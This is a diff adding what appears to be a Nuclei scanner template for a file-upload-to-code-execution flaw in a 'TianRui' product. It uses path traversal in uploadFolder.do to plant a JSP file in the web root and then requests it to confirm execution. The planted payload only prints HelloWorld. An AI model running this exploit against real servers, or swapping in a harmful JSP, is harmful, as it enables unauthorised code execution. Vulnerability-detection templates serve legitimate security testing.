@@ -1,0 +1,60 @@
+id: TianRui-uploadFolder-uploadToRce
+
+info:
+  name: TianRui-uploadFolder-uploadToRce
+  author: iSee857
+  severity: high
+  description: |
+    TianRui-uploadFolder-uploadToRce
+
+variables:
+  filename: "hello{{rand_int(10000, 99999)}}.jsp"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "upload-file"
+    method: POST
+    path:
+      - "{{BaseURL}}/lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+      Accept: "*/*"
+      Connection: "close"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm"
+    body: |
+      ------WebKitFormBoundaryXqK9dR2yTv7wNpLm
+      Content-Disposition: form-data; name="file"; filename="{{filename}}"
+      Content-Type: image/png
+
+      <% out.println("HelloWorld");%>
+      ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+
+  - id: "execute-file"
+    method: GET
+    path:
+      - "{{BaseURL}}/{{filename}}"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
+      Accept: "*/*"
+      Connection: "close"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HelloWorld"
